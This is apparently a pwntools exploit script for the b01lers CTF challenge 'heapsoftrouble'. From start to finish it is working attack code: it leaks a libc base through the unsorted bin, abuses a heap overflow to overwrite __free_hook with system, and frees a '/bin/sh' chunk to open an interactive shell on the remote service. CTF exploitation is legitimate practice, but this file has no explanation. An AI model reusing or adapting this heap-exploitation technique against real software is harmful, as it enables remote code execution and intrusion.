#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#libc
libc = ELF('./heapsoftrouble.libc')

#Utils
def create(name,population):
	io.sendlineafter('Exit\n','1')
	io.sendlineafter('Matrix: ',name)
	io.sendlineafter('to new matrix: ',f'{population}')

def delete(matrix):
	io.sendlineafter('Exit\n','2')
	io.sendafter('Matrix: ',matrix)

def overflow(data):
	io.sendlineafter('Exit\n','7')
	io.sendline(data)

def viewallmatrix():
	io.sendlineafter('Exit\n','5')
	data = io.recvuntil('1)')
	
	return data

#Addr
unsorted_bin_addr = 0x1b9a40
__free_hook = 0x1bbca8
system = 0x45430

#Exploit
if __name__ == '__main__':
#	io = process('./chall',env={'LD_PRELOAD':libc.path})
	io = remote('chal.ctf.b01lers.com',1010)

	io.sendlineafter('Login: ','HKHK')
	for i in xrange(0x10):
		delete(f'Matrix #{i}\0\n')	
	for i in xrange(0x10):
		if (i==1): create(f'A'*0x28, 0x10); continue
		if (i==13): create(f'HKHK #{i}'.encode()+p64(0x41),f'{i}')
		else: create(f'HKHK #{i}',f'{i}')	
	delete('HKHK #6\0\n')
	for i in xrange(7):
		overflow('AAAA')
	overflow(b'A'*0x28+p64(0x10421)+b'A'*0x8+b'\0')
	delete('A'*0x8+'\n')
	for i in xrange(10):
		overflow('A')
	overflow('A'*0x18)
	overflow('a'*0x18)
	overflow('BBBB')
	unsorted_bin = u64(viewallmatrix().split(b'\n')[0][0x18:0x20])
	libc_base = unsorted_bin - unsorted_bin_addr
	print(hex(libc_base))
	delete('HKHK #3\0\n')
	delete('HKHK #4\0\n')
	delete('HKHK #5\0\n')

	for i in xrange(5):
		overflow('a')
	delete('HKHK #8\0\n')
	overflow('a')
	overflow('a')
	overflow(p64(libc_base+__free_hook)[0x0:0x6])

	create('A\0\n',0x1)
	create('B\0\n',0x1)
	create('C\0\n',0x1)
	create('/bin/sh\0\n',0x1)
	create(p64(libc_base+system),0x1)

	delete('/bin/sh\0\n')
	io.interactive()
